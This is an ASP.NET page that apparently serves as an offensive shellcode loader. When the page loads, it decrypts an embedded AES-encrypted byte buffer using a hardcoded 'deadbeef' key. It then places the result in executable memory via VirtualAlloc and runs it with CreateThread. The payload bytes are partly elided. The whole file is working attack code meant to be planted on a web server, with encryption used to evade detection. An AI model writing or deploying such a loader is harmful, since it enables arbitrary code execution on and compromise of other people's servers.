<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Runtime.InteropServices"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Security.Cryptography"%> 

<script runat="server">

    // class is defined on namespace level, beyond page_load
    public class AESInject  
    {
        public static Int32 MEM_COMMIT = 0x1000;
        public static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

        public static byte[] AESDecrypt(byte[] cipherText, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                return aesAlg.CreateDecryptor().TransformFinalBlock(cipherText, 0, cipherText.Length);
            }
        }
    } 

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] bufenc = new byte[896]{0x25,0x54,0x92,0x18,0x65,0x6d,
        ...
        //  --encrypt aes256 --encrypt-key deadbeefdeadbeefdeadbeefdeadbeef  --encrypt-iv deadbeefdeadbeef
...
0xe0,0x0e};
        byte[] key = Convert.FromBase64String("ZGVhZGJlZWZkZWFkYmVlZmRlYWRiZWVmZGVhZGJlZWY=");
        byte[] iv = Convert.FromBase64String("ZGVhZGJlZWZkZWFkYmVlZg==");
        byte[] buf = AESInject.AESDecrypt(bufenc, key, iv); //you're using AESInject Class
        IntPtr addr = AESInject.VirtualAlloc(IntPtr.Zero, (UIntPtr)buf.Length, AESInject.MEM_COMMIT, AESInject.PAGE_EXECUTE_READWRITE); // ditto
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr hThread = IntPtr.Zero; // hThread init
        IntPtr threadId = IntPtr.Zero;
        hThread = AESInject.CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, ref threadId); // AESInject again
    }
</script>
